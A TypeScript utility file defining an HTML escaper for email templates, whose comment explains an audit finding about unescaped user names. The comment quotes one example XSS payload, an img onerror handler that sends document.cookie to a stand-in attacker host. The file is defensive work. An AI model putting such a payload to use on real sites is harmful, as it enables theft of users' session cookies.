/**
 * Minimal HTML escaper for embedding untrusted strings into email
 * templates and other HTML output paths.
 *
 * Audit (2026-05-25) found user-supplied `name` flowing into welcome-
 * email templates without escaping. A user signing up with a name like
 *   <img src=x onerror="fetch('//attacker/?c='+document.cookie)">
 * would get that markup interpolated raw into the HTML body. Most
 * webmail clients (Gmail, Outlook web) strip <script> tags but allow
 * <img onerror> handlers, so this is a real exfiltration vector when
 * the recipient opens the email in their browser.
 *
 * Postmark's JSON API already prevents CRLF / header injection (the
 * From/To/Subject fields are JSON values, not raw header lines), so
 * this escaper is purely for the HtmlBody field.
 */
export function escapeHtml(input: string): string {
  return String(input)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
